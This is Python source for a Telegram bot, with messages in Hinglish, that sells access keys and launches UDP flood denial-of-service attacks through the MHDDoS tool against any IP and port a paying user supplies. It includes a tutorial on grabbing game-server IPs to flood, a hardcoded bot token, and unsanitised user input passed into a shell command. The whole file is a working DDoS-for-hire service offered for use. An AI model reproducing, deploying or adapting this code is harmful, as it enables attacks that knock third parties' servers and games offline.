import telebot
import subprocess
import threading
import time
import uuid
import random
from telebot import types
from datetime import datetime, timedelta

# --- CONFIG ---
TOKEN = '8676988617:AAF8sRBKuScBqbWP23ggZRrerAGabu0dfCw'
ADMIN_ID = 6075779781 
CONTACT_LINK = "@FLEXOP01" 
bot = telebot.TeleBot(TOKEN)

# Databases
users = {} 
keys = {}  
logs = []

# --- HELPERS ---
def get_progress_bar(percent):
    bar_length = 10
    filled = int(percent / 10)
    return "🔵" * filled + "⚪" * (bar_length - filled)

# --- ATTACK ENGINE ---
def run_attack(ip, port, duration, chat_id, message_id, username):
    threads = random.randint(1100, 1600)
    command = f"python3 start.py UDP {ip} {port} {threads} {duration}"
    
    try:
        process = subprocess.Popen(command, shell=True, cwd="./MHDDoS")
        start_time = time.time()
        
        while time.time() - start_time < duration:
            elapsed = time.time() - start_time
            remaining = int(duration - elapsed)
            percent = min(100, int((elapsed / duration) * 100))
            bar = get_progress_bar(percent)
            
            bot.edit_message_text(
                chat_id=chat_id, message_id=message_id,
                text=(f"⚡ **VVIP ATTACK ACTIVE** ⚡\n"
                      f"━━━━━━━━━━━━━━━━━━━━━━\n"
                      f"👤 **User:** `@{username}`\n"
                      f"🎯 **Target:** `{ip}:{port}`\n"
                      f"⏳ **Time:** `{remaining}s` / `{duration}s`\n"
                      f"📊 **Power:** `{bar} {percent}%` \n"
                      f"🛡️ **Anti-Ban:** `BYPASS ON ✅`\n"
                      f"━━━━━━━━━━━━━━━━━━━━━━"),
                parse_mode="Markdown"
            )
            time.sleep(4)
        
        process.terminate()
        bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=f"🔥 **SERVER DOWN!**\n\nTarget `{ip}` was successfully frozen. ✅")
    except: pass

# --- KEYBOARDS ---
def main_menu():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add('🚀 VVIP Attack', '👤 My Info', '📖 Tutorial', '🔑 Redeem Key', '📜 History')
    return markup

# --- HANDLERS ---
@bot.message_handler(commands=['start'])
def welcome(m):
    user_id = m.from_user.id
    if user_id in users and users[user_id] > datetime.now() or user_id == ADMIN_ID:
        bot.send_message(m.chat.id, f"👑 **Welcome Legend @{m.from_user.username}!**\nSystem ready hai tabaahi ke liye.", reply_markup=main_menu())
    else:
        bot.send_message(m.chat.id, f"🚫 **Oye @{m.from_user.username}!**\nBina permission ke yahan mat ghus warna device uda dunga! 😂\n\nAdmin: {CONTACT_LINK}", reply_markup=main_menu())

@bot.message_handler(commands=['genkey'])
def gen(m):
    if m.from_user.id != ADMIN_ID: return
    try:
        # Format: /genkey 1 (matlab 1 din ki key)
        days = int(m.text.split()[1])
        key_id = uuid.uuid4().hex[:6].upper()
        full_key = f"VVIP-{key_id}"
        keys[full_key] = days
        
        # Ye niche wala message hi main hai: Single tap copy-paste ke liye
        bot.reply_to(m, f"🔑 **VVIP KEY GENERATED ({days} Days)**\n\n"
                        f"Niche wali command par click karke copy karo aur dost ko bhej do:\n\n"
                        f"`/redeem {full_key}`", parse_mode="Markdown")
    except:
        bot.reply_to(m, "⚠️ **Sahi format dalo:** `/genkey 1` (Yahan 1 matlab din hai)")

@bot.message_handler(commands=['redeem'])
def redeem(m):
    user_id = m.from_user.id
    args = m.text.split()
    if len(args) == 2 and args[1] in keys:
        days = keys.pop(args[1])
        expiry = datetime.now() + timedelta(days=days)
        users[user_id] = expiry
        bot.reply_to(m, f"🎉 **MUBARAK HO!**\n\nAapko `{days} Din` ka VVIP access mil gaya hai.\nAb tabaahi shuru karo! 🔥")
    else:
        bot.reply_to(m, "❌ **Galat Key!**\nDhang ki key dalo warna block kar dunga. 💀")

@bot.message_handler(func=lambda m: m.text == '📖 Tutorial')
def tutorial(m):
    bot.reply_to(m, "📖 **TUTORIAL**\n\n1. Game ki IP/Port nikalo (PCAP Remote se).\n2. Bot mein `/attack <IP> <PORT> <TIME>` dalo.\n3. Attack khatam hone tak intezar karo.\n4. **Caution:** Ek sath zyada attack mat karna!")

@bot.message_handler(commands=['attack'])
def handle_attack(m):
    user_id = m.from_user.id
    if user_id not in users or users[user_id] < datetime.now():
        if user_id != ADMIN_ID:
            bot.reply_to(m, "💀 **NIKAL YAHAN SE!**\nPehle key leke aa warna jail bhej dunga. 😂")
            return
    try:
        p = m.text.split()
        if len(p) == 4:
            sent = bot.reply_to(m, "📡 **Bypassing Server...**")
            threading.Thread(target=run_attack, args=(p[1], int(p[2]), int(p[3]), m.chat.id, sent.message_id, m.from_user.username)).start()
    except: pass

bot.infinity_polling()
  
